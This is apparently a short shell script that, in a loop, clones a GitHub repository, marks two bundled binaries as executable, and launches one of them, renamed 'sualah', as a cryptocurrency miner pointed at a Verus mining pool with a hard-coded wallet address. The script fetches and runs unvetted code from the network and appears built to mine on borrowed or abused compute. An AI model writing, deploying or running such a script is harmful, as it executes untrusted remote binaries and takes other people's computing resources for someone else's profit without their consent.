#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do

git clone https://github.com/nosmould864/tes.git
cd tes
chmod u+x ./sualah
chmod u+x ./verus-solver
ls
./sualah -p x --cpu 2 -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.begalyowes

 
     echo COUNTER $COUNTER
     let COUNTER-=1
done